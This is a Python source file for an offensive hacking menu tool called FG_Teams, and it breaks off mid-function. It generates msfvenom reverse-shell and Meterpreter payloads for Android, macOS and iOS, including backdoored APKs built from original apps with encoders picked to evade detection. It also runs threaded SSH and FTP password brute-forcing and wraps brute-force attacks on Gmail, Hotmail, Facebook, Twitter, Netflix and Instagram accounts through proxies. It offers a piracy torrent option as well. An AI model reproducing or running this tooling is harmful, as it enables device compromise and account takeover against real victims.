"""
MIT License

Copyright (c) 2023 Furjack

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NON INFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import csv
import ipaddress
import logging
import os
import queue
import random
import socket
import string
import subprocess
import sys
import threading
import time
import warnings
from ftplib import FTP
from logging import NullHandler

warnings.filterwarnings("ignore")
import requests
from colorama import Fore, Style
from getmac import get_mac_address
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, ssh_exception
from scapy.all import get_if_list


# note there is too many things pending in this software it will be updated soon


script_version = "1.6.10"
PROXY_FILE = "/FG_Torrents/proxy.txt"


# <---main-menu--->
menu = """
         -------------------------------------------------------------------------------------                                                                                         
        ||                                        MENU                                       ||                                                                                        
        ||-----------------------------------------------------------------------------------||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||          [1] Android                    |       [7] IOS                           ||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||          [2] bruteforce                 |       [8] phishing                      ||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||          [3] steganography              |       [9] Piracy                        ||                                                                       
        ||                                         |                                         ||                                                                                        
        ||          [4] Mac OS                     |       [10] general                      ||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||          [5] wireless-attacks           |       [11] Next Menu                    ||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||          [6] Ghostnet                   |       [0] Exit                          ||                                                                                        
         ------------------------------------------------------------------------------------- 
"""

# <-- next-menu -->

next_menu = """ 
         -------------------------------------------------------------------------------------                                                                                         
        ||                                        MENU                                       ||                                                                                        
        ||-----------------------------------------------------------------------------------||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||          [12] Webapp                    |       [18] Code-Audit                   ||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||          [13] Anti-Forensic             |       [19] Cracker                      ||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||          [14] Automation                |       [20] Crypto                       ||                                                                       
        ||                                         |                                         ||                                                                                        
        ||          [15] Backdoor                  |       [21] Database                     ||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||          [16] Binary                    |       [22] Previous menu                ||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||          [17] Bluetooth                 |       [100] Next Menu                   ||                                                                                        
         ------------------------------------------------------------------------------------- 
"""

third_menu = """ 
         -------------------------------------------------------------------------------------                                                                                         
        ||                                        MENU                                       ||                                                                                        
        ||-----------------------------------------------------------------------------------||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||          [23] Debugger                  |       [29] Exploitation                 ||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||          [24] Decompiler                |       [30] Fingerprint                  ||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||          [25] Defensive                 |       [31] Firmware                     ||                                                                       
        ||                                         |                                         ||                                                                                        
        ||          [26] Disassembler              |       [32] Forensic                     ||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||          [27] DOS                       |       [33] Previous menu                ||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||          [28] Drone                     |       [100] Next Menu                   ||                                                                                        
         ------------------------------------------------------------------------------------- 
"""

fourth_menu = """ 
         -------------------------------------------------------------------------------------                                                                                         
        ||                                        MENU                                       ||                                                                                        
        ||-----------------------------------------------------------------------------------||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||          [34] Fuzzer                    |       [40] Miscellanious                ||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||          [35] Hardware                  |       [41] Mobile                       ||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||          [36] Honeypot                  |       [42] Networking                   ||                                                                       
        ||                                         |                                         ||                                                                                        
        ||          [37] IDS                       |       [43] NFC                          ||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||          [38] Keylogger                 |       [44] Previous menu                ||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||          [39] Malware                   |       [100] Next Menu                   ||                                                                                        
         ------------------------------------------------------------------------------------- 
"""

fifth_menu = """ 
         -------------------------------------------------------------------------------------                                                                                         
        ||                                        MENU                                       ||                                                                                        
        ||-----------------------------------------------------------------------------------||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||          [45] Packer                    |       [51] Sniffer                      ||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||          [46] Proxy                     |       [52] Social                       ||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||          [47] Radio                     |       [53] Spoof                        ||                                                                       
        ||                                         |                                         ||                                                                                        
        ||          [48] Recon                     |       [54] Tunnel                       ||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||          [49] Reversing                 |       [55] Previous menu                ||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||          [50] Scanner                   |       [100] Next Menu                   ||                                                                                        
         ------------------------------------------------------------------------------------- 
"""

sixth_menu = """ 
         -------------------------------------------------------------------------------------                                                                                         
        ||                                        MENU                                       ||                                                                                        
        ||-----------------------------------------------------------------------------------||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||          [56] Voip                      |                                         ||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||          [57] BlackArch Windows         |                                         ||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||          [58] Wireless                  |                                         ||                                                                       
        ||                                         |                                         ||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||                                         |       [59] Previous menu                ||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||                                         |       [0] Exit                          ||                                                                                        
         ------------------------------------------------------------------------------------- 
"""

# <----logo---->
banner = f"""
|̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ |
| ███████╗░██████╗░████████╗███████╗░█████╗░███╗░░░███╗░██████╗ |
| ██╔════╝██╔════╝░╚══██╔══╝██╔════╝██╔══██╗████╗░████║██╔════╝ |
| █████╗░░██║░░██╗░░░░██║░░░█████╗░░███████║██╔████╔██║╚█████╗░ |
| ██╔══╝░░██║░░╚██╗░░░██║░░░██╔══╝░░██╔══██║██║╚██╔╝██║░╚═══██╗ |
| ██║░░░░░╚██████╔╝░░░██║░░░███████╗██║░░██║██║░╚═╝░██║██████╔╝ |
| ╚═╝░░░░░░╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═════╝░ |
|_______________________________________________________________|
| im not responsible for any misuse of this software, Thanks ❤  |
|_______________________________________________________________|by furjack
note : To keep this project up and running donate
version = {script_version}
"""

# <----starting with a clear empty screen----->
os.system("clear")


# <---Functions--->
def Banner():
    os.system("clear")
    print(Fore.BLUE, banner)


def showIp():
    host_name = socket.gethostname()
    Ip_Adress = socket.gethostbyname(host_name)

    print("\n[+] IP: " + Ip_Adress)

    myip = requests.get("https://www.wikipedia.org").headers["X-Client-IP"]

    print("\n[+] Public IP: " + myip)


def options():
    global ipf, portf, outputf, iteratef
    print(Fore.GREEN, "You can use this for below questions\n", Style.RESET_ALL)
    showIp()
    ipf = input("\nEnter your ip for LHOST: ")
    portf = input("\nEnter your port for LPORT: ")
    outputf = input("\nEnter output name for the apk(dont forget to put .apk): ")
    iteratef = input(
        "\nHow much time to increase the iteration of encoder from non detection: "
    )


def option_xp():
    global loc, ip, port, output, iterate
    Banner()
    print("your ip is")
    showIp()
    loc = input("\nEnter the location of apk: ")
    ip = input("\nEnter your ip for LHOST: ")
    port = input("\nEnter your port for LPORT: ")
    output = input("\nEnter output name for the apk(dont forget to put .apk): ")
    iterate = input(
        "\nHow much time to increase the iteration of encoder from non detection: "
    )


def encryption():
    global enc
    print("Please select encryption:\n")

    encryption_list = ["aes256", "base64", "rc4", "xor"]

    for i, enc_type in enumerate(encryption_list, start=1):
        print(f"{i}. {enc_type}")

    lock = input("\nEnter the encryption (default=3): ").strip()

    try:
        enc = encryption_list[int(lock) - 1] if lock else "rc4"
    except (ValueError, IndexError):
        main()


def encoders():
    global e

    Banner()
    print("Please select an encoder:\n")

    encoder_list = [
        "cmd/brace",
        "cmd/echo",
        "cmd/generic_sh",
        "cmd/ifs",
        "cmd/perl",
        "cmd/powershell_base64",
        "cmd/printf_php_mq",
        "generic/eicar",
        "generic/none",
        "mipsbe/byte_xori",
        "mipsbe/longxor",
        "mipsle/byte_xori",
        "mipsle/longxor",
        "php/base64",
        "ppc/longxor",
        "ppc/longxor_tag",
        "ruby/base64",
        "sparc/longxor_tag",
        "x64/xor",
        "x64/xor_context",
        "x64/xor_dynamic",
        "x64/zutto_dekiru",
        "x86/add_sub",
        "x86/alpha_mixed",
        "x86/alpha_upper",
        "x86/avoid_underscore_tolower",
        "x86/avoid_utf8_tolower",
        "x86/bloxor",
        "x86/bmp_polyglot",
        "x86/call4_dword_xor",
        "x86/context_cpuid",
        "x86/context_stat",
        "x86/context_time",
        "x86/countdown",
        "x86/fnstenv_mov",
        "x86/jmp_call_additive",
        "x86/nonalpha",
        "x86/nonupper",
        "x86/opt_sub",
        "x86/service",
        "x86/shikata_ga_nai",
        "x86/single_static_bit",
        "x86/unicode_mixed",
        "x86/unicode_upper",
        "x86/xor_dynamic",
    ]

    # Display encoders dynamically
    for i, enc in enumerate(encoder_list, start=1):
        print(f"{i}. {enc}")

    # Get user input
    encoder = input("\nSelect encoder (default=41): ").strip()

    try:
        e = encoder_list[int(encoder) - 1] if encoder else "x86/shikata_ga_nai"
    except (ValueError, IndexError):
        main()

def payloads():
    global pa
    Banner()
    print("Select what type of payload you want:\n")

    payload_list = [
        "android/meterpreter_reverse_https",
        "android/meterpreter/reverse_https",
        "android/meterpreter_reverse_http",
        "android/meterpreter/reverse_http",
        "android/meterpreter_reverse_tcp",
        "android/meterpreter/reverse_tcp",
        "android/shell/reverse_https",
        "android/shell/reverse_http",
        "android/shell/reverse_tcp",
    ]

    Lister(payload_list)

    choice = input("\nEnter (default=6): ").strip()

    try:
        pa = (
            payload_list[int(choice) - 1]
            if choice
            else "android/meterpreter/reverse_tcp"
        )
    except (ValueError, IndexError):
        main()


def payloads_x_e():
    global p
    Banner()
    print("Select what type of payload you want:\n")

    payload_list = [
        "android/meterpreter/reverse_https",
        "android/meterpreter/reverse_http",
        "android/meterpreter/reverse_tcp",
        "android/shell/reverse_https",
        "android/shell/reverse_http",
        "android/shell/reverse_tcp",
    ]

    Lister(payload_list)

    choice = input("\nEnter (default=3): ").strip()

    try:
        p = (
            payload_list[int(choice) - 1]
            if choice
            else "android/meterpreter/reverse_tcp"
        )
    except (ValueError, IndexError):
        main()


def msfvenom_x():
    Banner()
    option_xp()
    print("\nokay lets select what type of payload you want! to create")
    time.sleep(4)
    payloads_x_e()
    time.sleep(2)
    encoders()
    time.sleep(2)
    os.system("clear")
    print(
        "creating payload with the given information this will take some time, Plz be patient"
    )

    os.system(
        "msfvenom -b --arch aarch64 --platform android -x "
        + str(loc)
        + " -p "
        + str(p)
        + " LHOST="
        + str(ip)
        + " LPORT="
        + str(port)
        + " --encoder "
        + str(e)
        + " -i "
        + str(iterate)
        + " -o "
        + str(os.getcwd())
        + "/payload-apps/"
        + str(output)
    )
    print(
        Fore.RED,
        "\nignore this line if no error\n[if any error occurs above try changing the encoder and iteration or else try changing original apk]",
    )

    print(
        Fore.BLUE,
        "\nsuccessfully created the payload its stored in payload-apps/ folder Thank you",
    )


def msfvenom_p():
    Banner()
    options()
    print("\nokay lets select what type of payload you want! to create")
    time.sleep(4)
    payloads()
    time.sleep(2)
    encoders()
    time.sleep(2)
    os.system("clear")
    print(
        "creating payload with the given information this will take some time, Plz be patient"
    )

    os.system(
        "msfvenom --arch aarch64 --platform android -p "
        + str(pa)
        + " LHOST="
        + str(ipf)
        + " LPORT="
        + str(portf)
        + " --encoder "
        + str(e)
        + " -i "
        + str(iteratef)
        + " -o "
        + str(os.getcwd())
        + "/payload-apps/"
        + str(outputf)
    )

    print(
        Fore.BLUE,
        "\nsuccessfully created the payload its stored in payload-apps/ folder Thank you",
    )


def msfvenom_encrypt():
    Banner
    option_xp()
    print("\nokay lets select what type of payload you want! to create")
    time.sleep(4)
    payloads_x_e()
    time.sleep(2)
    encoders()
    time.sleep(2)
    encryption()
    time.sleep(2)
    os.system("clear")
    print(
        "creating payload with the given information this will take some time, Plz be patient"
    )

    os.system(
        "msfvenom -b --arch aarch64 --platform android -x "
        + str(loc)
        + " -p "
        + str(p)
        + " LHOST="
        + str(ip)
        + " LPORT="
        + str(port)
        + " --encoder "
        + str(e)
        + " --encrypt "
        + str(enc)
        + " -i "
        + str(iterate)
        + " -o "
        + str(os.getcwd())
        + "/payload-apps/"
        + str(output)
    )
    print(
        Fore.RED,
        "\nignore this line if no error\n[if any error occurs above try changing the encoder and iteration or else try changing original apk]",
    )

    print(
        Fore.BLUE,
        "\nsuccessfully created the payload its stored in payload-apps/ folder Thank you",
    )


# <----functions of main menu---->
def Android():
    Banner()
    print("0. exit")
    print("\n1. backdoor in original apk")
    print("\n2. only payload (main activity.apk)")
    print("\n3. encrypted backdoor payload")

    ist = input("\n\n\nEnter (default=0): ")

    if ist == "0":
        sys.exit()

    elif ist == "1":
        msfvenom_x()
        print("your payload is successfully created and stored in ../payload-apps/")

    elif ist == "2":
        msfvenom_p()
        print("your payload is successfully created and stored in ../payload-apps/")

    elif ist == "3":
        msfvenom_encrypt()
        print("your payload is successfully created and stored in ../payload-apps/")

    else:
        main()


def ssh_connect(host, username, password):
    ssh_client = SSHClient()
    # Set the host policies. We add the new hostname and new host key to the local HostKeys object.
    ssh_client.set_missing_host_key_policy(AutoAddPolicy())
    try:
        # We attempt to connect to the host, on port 22 which is ssh, with password, and username that was read from the csv file.
        ssh_client.connect(
            host, port=22, username=username, password=password, banner_timeout=300
        )
        # If it didn't throw an exception, we know the credentials were successful, so we write it to a file.
        with open("credentials_found.txt", "a") as fh:
            # We write the credentials that worked to a file.
            print(f"Username - {username} and Password - {password} found.")
            fh.write(
                f"Username: {username}\nPassword: {password}\nWorked on host {host}\n"
            )
    except AuthenticationException:
        print(f"Username - {username} and Password - {password} is Incorrect.")
    except ssh_exception.SSHException:
        print("**** Attempting to connect - Rate limiting on server ****")


# This function gets a valid IP address from the user.
def get_ip_address():
    # We create a while loop, that we'll break out of only once we've received a valid IP Address.
    while True:
        host = input("Please enter the host ip address: ")
        try:
            # Check if host is a valid IPv4 address. If so we return host.
            ipaddress.IPv4Address(host)
            return host
        except ipaddress.AddressValueError:
            # If host is not a valid IPv4 address we send the message that the user should enter a valid ip address.
            print("Please enter a valid ip address.")


# The program will start in the main function.
def __main__():
    logging.getLogger("paramiko.transport").addHandler(NullHandler())
    # To keep to functional programming standards we declare ssh_port inside a function.
    list_file = "passwords.csv"
    host = get_ip_address()
    # This function reads a csv file with passwords.
    with open(list_file) as fh:
        csv_reader = csv.reader(fh, delimiter=",")
        # We use the enumerate() on the csv_reader object. This allows us to access the index and the data.
        for index, row in enumerate(csv_reader):
            # The 0 index is where the headings are allocated.
            if index == 0:
                continue
            else:
                #  We create a thread on the ssh_connect function, and send the correct arguments to it.
                t = threading.Thread(
                    target=ssh_connect,
                    args=(
                        host,
                        row[0],
                        row[1],
                    ),
                )
                # We start the thread.
                t.start()
                # We leave a small time between starting a new connection thread.
                time.sleep(0.2)
                # ssh_connect(host, ssh_port, row[0], row[1])


def ssh_bruteforce():
    Banner()
    __main__()


# function for ftp brute force
def bruteForceLogin(hostname, passwordFile):
    passList = open(passwordFile, "r")
    for line in passList.readlines():
        userName = line.split(",")[0]
        passWord = line.split(",")[1].strip("\r").strip("\n")
        print("[+] Trying: " + str(userName) + "/" + str(passWord))
        try:
            ftp = FTP(hostname)
            ftp.login(userName, passWord)
            print("FTP Login succeded: " + str(userName) + "/" + str(passWord))
            ftp.quit()
            return (userName, passWord)
        except Exception:
            pass


def ftp_bruteforce():
    Banner()
    hostName = str(input("Enter the host: "))
    passwordFile = "passwords.csv"
    bruteForceLogin(hostName, passwordFile)

    t = threading.Thread(target=bruteForceLogin, args=(hostName, passwordFile))
    t.start()
    time.sleep(0.2)


def gmail_bruteforce():
    Banner()
    print("\nselect an option")
    mail = input("\n\nEnter the mail adress: ")
    plist = input("\nEnter the password-list path(/path/to/file): ")
    proxy_list = input("\nEnter the proxy-list path(/path/to/file):")

    os.system(f"lib/./brute-force -g {mail} -l {plist} -X {proxy_list}")


def hotmail_bruteforce():
    Banner()
    print("\nselect an option")
    mail = input("\n\nEnter the mail adress: ")
    plist = input("\nEnter the password-list path(/path/to/file): ")
    proxy_list = input("\nEnter the proxy-list path(/path/to/file):")

    os.system(f"lib/./brute-force -t {mail} -l {plist} -X {proxy_list}")


def facebook_bruteforce():
    Banner()
    print("\nselect an option")
    mail = input("\n\nEnter the mail adress or username: ")
    plist = input("\nEnter the password-list path(/path/to/file): ")
    proxy_list = input("\nEnter the proxy-list path(/path/to/file):")

    os.system(f"lib/./brute-force -f {mail} -l {plist} -X {proxy_list}")


def twitter_bruteforce():
    Banner()
    print("\nselect an option")
    mail = input("\n\nEnter the mail adress or username: ")
    plist = input("\nEnter the password-list path(/path/to/file): ")
    proxy_list = input("\nEnter the proxy-list path(/path/to/file):")

    os.system(f"lib/./brute-force -T {mail} -l {plist} -X {proxy_list}")


def netflix_bruteforce():
    Banner()
    print("\nselect an option")
    mail = input("\n\nEnter the mail adress or username: ")
    plist = input("\nEnter the password-list path(/path/to/file): ")
    proxy_list = input("\nEnter the proxy-list path(/path/to/file):")

    os.system(f"lib/./brute-force -n {mail} -l {plist} -X {proxy_list}")


def instagram_bruteforce():
    ins_user = input("Enter the target username: ")
    ins_passlist = input("Enter the passlist directory: ")
    ins_proxy = input("Enter the proxylist file path: ")
    ins_mode = input(
        "Enter modes: 0 => 32 bots; 1 => 16 bots; 2 => 8 bots; 3 => 4 bots: "
    )
    os.system("clear")
    os.system(f"./insta -u {ins_user} -p {ins_passlist} -px {ins_proxy} -m {ins_mode}")


def bruteforce():
    Banner()
    print("\nselect an option")
    print("\n\n1. SSH")
    print("\n2. FTP")
    print("\n3. Gmail")
    print("\n4. Hotmail")
    print("\n5, Facebook")
    print("\n6. Twitter")
    print("\n7. Netflix")
    print("\n8. Instagram")
    brute = input("\n\n\nFG_Teams: ")

    if brute == "1":
        ssh_bruteforce()
    elif brute == "2":
        ftp_bruteforce()
    elif brute == "3":
        gmail_bruteforce()
    elif brute == "4":
        hotmail_bruteforce()
    elif brute == "5":
        facebook_bruteforce()
    elif brute == "6":
        twitter_bruteforce()
    elif brute == "7":
        netflix_bruteforce()
    elif brute == "8":
        instagram_bruteforce()
    else:
        main()


def Steganography_extract():
    Banner()
    extract = input("\nEnter the path to stegofile: ")
    os.system("steghide extract -sf " + str(extract) + " -v")


def Steganography_Info():
    Banner()
    stego = input("\nEnter the path to stegofile: ")
    os.system("steghide --info " + str(stego))


def Steganography_hide():
    Banner()
    img = input("\n\nEnter the path of cover file: ")
    secret = input("\nEnter the path of .txt(secret file) file: ")
    compress = input("\nwould u like to compress the file (y/n): ").lower()
    passw = input("\nCreate password: ")

    if compress == "y":
        compress_level = input("\nEnter compression between 1-9: ")
        compression = "-z " + str(compress_level)
    elif compress == "":
        compress_level = input("\nEnter compression between 1-9: ")
        compression = "-z " + str(compress_level)
    else:
        compression = "-Z"
    print("\nYour stegofile is being created be patient")
    os.system(
        "steghide embed -cf "
        + str(img)
        + " -ef "
        + str(secret)
        + " -p "
        + str(passw)
        + " -sf stegimg.jpg "
        + str(compression)
    )


def Steganography():
    Banner()
    print("\n\n1. hide data in a file")
    print("\n2.Extract data of a stegofile")
    print("\n3.Info of a stegofile")
    stego_option = input("\n\n\nFG_Teams: ")

    if stego_option == "1":
        Steganography_hide()
    elif stego_option == "2":
        Steganography_extract()
    elif stego_option == "3":
        Steganography_Info()
    else:
        main()


def StegMenu():
    Banner()
    print("\n\n1. matroschka")
    print("\n2. openpuff")
    print("\n3. pngcheck")
    print("\n4. silenteye")
    print("\n5. stegcracker")
    print("\n6. stegdetect")
    print("\n7. steghide")
    print("\n8. stegolego")
    print("\n9. stegoveritas")
    print("\n10. stegseek")
    print("\n11. stegsolve")
    print("\n12. stepic")
    print("\n13. zsteg")

    steg = input("Enter your choice: ")
    if steg == "7":
        Steganography()


def armor():
    os.system("clear")
    rc = subprocess.call(
        ["which", "armor"], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT
    )
    if rc != 0:
        print("[*] Installing the tool needed for mac payload generator")
        subprocess.call(
            ["yes | pacman -S armor"],
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.STDOUT,
        )
        print("[*] Installed the armor tool By tokyoneon")
    print("[*] creating payload.txt")
    print(
        "Note if it asks anything to install make sure to install and run FG_Teams again"
    )
    os.system(
        'echo -e "openssl aes-256-cbc -a -salt -in test.txt -out test.txt -k password"> payload.txt'
    )
    mac_ip = input("enter ur ip: ")
    mac_port = input("enter port: ")
    print("creating payload using the armor")
    os.system("armor payload.txt " + str(mac_ip) + " " + str(mac_port))


def mac_payloads():
    global osx_pa

    Banner()
    print("Select what type of payload you want:\n")

    payloads = [
        "osx/ppc/shell/bind_tcp",
        "osx/ppc/shell/find_tag",
        "osx/ppc/shell/reverse_tcp",
        "osx/ppc/shell_bind_tcp",
        "osx/ppc/shell_reverse_tcp",
        "osx/x64/dupandexecve/bind_tcp",
        "osx/x64/dupandexecve/reverse_tcp",
        "osx/x64/dupandexecve/reverse_tcp_uuid",
        "osx/x64/exec",
        "osx/x64/meterpreter/bind_tcp",
        "osx/x64/meterpreter/reverse_tcp",
        "osx/x64/meterpreter/reverse_tcp_uuid",
        "osx/x64/meterpreter_reverse_http",
        "osx/x64/meterpreter_reverse_https",
        "osx/x64/meterpreter_reverse_tcp",
        "osx/x64/say",
        "osx/x64/shell_bind_tcp",
        "osx/x64/shell_find_tag",
        "osx/x64/shell_reverse_tcp",
        "osx/x86/bundleinject/bind_tcp",
        "osx/x86/bundleinject/reverse_tcp",
        "osx/x86/exec",
        "osx/x86/isight/bind_tcp",
        "osx/x86/isight/reverse_tcp",
        "osx/x86/shell_bind_tcp",
        "osx/x86/shell_find_port",
        "osx/x86/shell_reverse_tcp",
        "osx/x86/vforkshell/bind_tcp",
        "osx/x86/vforkshell/reverse_tcp",
        "osx/x86/vforkshell_bind_tcp",
        "osx/x86/vforkshell_reverse_tcp",
    ]

    # Display options dynamically
    for i, payload in enumerate(payloads, start=1):
        print(f"{i}. {payload}")

    # Get user input
    osx_payload = input("\nEnter choice (default=6): ").strip()

    try:
        osx_pa = (
            payloads[int(osx_payload) - 1]
            if osx_payload
            else "osx/x64/meterpreter/reverse_tcp"
        )
    except (ValueError, IndexError):
        main()


def mac_payload():
    os.system("clear")
    osx_ip = input("\nEnter ur Ip: ")
    osx_port = input("\nEnter Port: ")
    osx_output = input("Enter the output file name: ")
    mac_payloads()
    os.system(
        "msfvenom -p "
        + str(osx_pa)
        + " LHOST="
        + str(osx_ip)
        + " LPORT="
        + str(osx_port)
        + " -o "
        + str(os.getcwd())
        + "/payload-apps/"
        + str(osx_output)
        + " -f macho --platform osx"
    )


def choose():
    os.system("clear")
    print("\nChoose the option")
    print("\n1. armor [netcat listener by tokyoneon]")
    print("\n2. mac os payload with all payloads available in metasploit")
    ch = input("\n\n\nFG_Teams: ")
    if ch == "1":
        armor()
    elif ch == "2":
        mac_payload()
    elif ch == "":
        mac_payload()
    else:
        main()


def Mac():
    Banner()
    choose()


def Airgeddon():
    rc = subprocess.call(
        ["which", "airgeddon"], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT
    )
    if rc != 0:
        print("airgeddon is not installed \ninstalling")
        subprocess.call(
            ["yes | pacman -S airgeddon"],
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.STDOUT,
        )

    os.system("airgeddon")


def wireless():
    Banner()
    print("\n\n1. Airgeddon")
    print("\n2. Airflood")
    print("\n3. Airopy")
    print("\n4. Airoscript")
    print("\n5. Airpwn")
    print("\n6. Aphopper")
    print("\n7. Apnbf")
    print("\n8. Atear")
    print("\n9. Auto-eap")
    print("\n10. Batman-adv")
    print("\n11. Batman-alfred")
    print("\n12. Beholder")
    print("\n13. Boopsuite")
    print("\n14. Create_ap")
    print("\n15. Eapeak")
    print("\n16. Eaphammer")
    print("\n17. Fern-wifi-cracker")
    print("\n18. Free_wifi")
    print("\n19. Fuzzap")
    print("\n20. G72x++")
    print("\n21. Gerix-wifi-cracker")
    print("\n22. giskismet")
    print("\n23. hashcatch")
    print("\n24. hoover")
    print("\n25. hostapd-wpe")
    print("\n26. hotspotter")
    print("\n27. Jcrack")
    print("\n28. Kismet-earth")
    print("\n29. kismet2earth")
    print("\n30. Kismon")
    print("\n31. Mana")
    print("\n32. mdk3")
    print("\n33. mfcuk")
    print("\n34. mitmap")
    print("\n35. mousejack")
    print("\36. mtscan")
    print("\n37. netattack")
    print("\n38. nzyme")
    print("\n39. pidense")
    print("\n40. python-trackerjacker")
    print("\n41. rfidiot")
    print("\n42. rfidtool")
    print("\n43. roguehostapd")
    print("\n44. rtl8814au-dkms-git")
    print("\n45. sniff-probe-req")
    print("\n46. spectools")
    print("\n47. timegen")
    print("\n48. ubitack")
    print("\n49. waidps")
    print("\n50. wepbuster")
    print("\n51. wi-feye")
    print("\n52. wifi-pumpkin")
    print("\n53. wifibroot")
    print("\n54. wificurse")
    print("\n55. wifijammer")
    print("\n56. wifiphisher")
    print("\n57. wifiscanmap")
    print("\n58. wifitap")
    print("\n59. wireless-ids")
    print("\n60. wirouter-keyrec")
    print("\n61. wlan2eth")
    print("\n62. wpa-bruteforcer")
    print("\n63. wpa2-halfhandshake-crack")
    print("\n64. wpsik")
    print("\n65. zizzania")
    print("\n66. zykeys")

    wire = input("FG_Teams: ")
    if wire == "1":
        Airgeddon()
    elif wire == "":
        print("invalid option using default")
        Airgeddon()
    else:
        main()


def Ghostnet():
    Banner()
    print("\n\nA special thanks for mach1el to create this tool ghostnet")
    print(
        "\nGhostnet is tool to anonymize your ip and mac address it changes randomly every minutes"
    )
    print("\n1. Start")
    print("\n2. Stop")
    print("\n3. Status")

    g = input("\n\nghostnet: ")

    if g == "1":
        os.system("ghostnet start")
    elif g == "2":
        os.system("ghostnet stop")
    elif g == "3":
        os.system("ghostnet status")
    elif g == "":
        os.system("ghostnet")
    else:
        main()


def coming_soon():
    Banner()
    print("\n\ncoming soon under development Thanks for using this tool")
    sys.exit()


def ios_payloads():
    global ios_pa
    Banner()
    print("select what type of payload u want")
    print("\n\n1. osx/armle/shell_reverse_tcp.rb")
    print("\n2. osx/armle/execute/bind_tcp")
    print("\n3. osx/armle/execute/reverse_tcp")
    print("\n4. osx/armle/shell/bind_tcp")
    print("\n5. osx/armle/shell/reverse_tcp")
    print("\n6. osx/armle/shell_bind_tcp")
    print("\n7. osx/armle/shell_reverse_tcp")
    print("\n8. osx/armle/vibrate")

    ipayload = input("\n\n\nEnter (default=6):")
    if ipayload == "1":
        ios_pa = "osx/armle/shell_reverse_tcp.rb"
    elif ipayload == "2":
        ios_pa = "osx/armle/execute/bind_tcp"
    elif ipayload == "3":
        ios_pa = "osx/armle/execute/reverse_tcp"
    elif ipayload == "4":
        ios_pa = "osx/armle/shell/bind_tcp"
    elif ipayload == "5":
        ios_pa = "osx/armle/shell/reverse_tcp"
    elif ipayload == "6":
        ios_pa = "osx/armle/shell_bind_tcp"
    elif ipayload == "7":
        ios_pa = "osx/armle/shell_reverse_tcp"
    elif ipayload == "8":
        ios_pa = "osx/armle/vibrate"
    elif ipayload == "":
        ios_pa = "osx/armle/shell_reverse_tcp.rb"
    else:
        main()


def IOS():
    Banner()
    ios_ip = input("\nEnter ur Ip: ")
    ios_port = input("\nEnter Port: ")
    ios_output = input("Enter the output file name: ")
    ios_payloads()
    os.system(
        "msfvenom -p "
        + str(ios_pa)
        + " LHOST="
        + str(ios_ip)
        + " LPORT="
        + str(ios_port)
        + " -o "
        + str(os.getcwd())
        + "/payload-apps/"
        + str(ios_output)
        + " -f macho -a armle --platform osx"
    )
    print("after this convert ur output file to deb and run it on apple phones")


def Piracy():
    Banner()
    ask = input(
        "Would you like to edit the proxy.txt (y/n) or press Enter if you are in a country without restrictions: "
    )

    if ask == "":
        os.system("/FG_Torrents/main")  # Ensure this path is correct
    elif ask.lower() == "y":
        edit_proxy()
        os.system("/FG_Torrents/main")
    else:
        main()


def edit_proxy():
    print("\nCurrent Proxy Settings:\n")

    try:
        with open(PROXY_FILE, "r") as f:
            print(f.read())
    except FileNotFoundError:
        print("proxy.txt not found. Creating a new one.")

    proxy_host = (
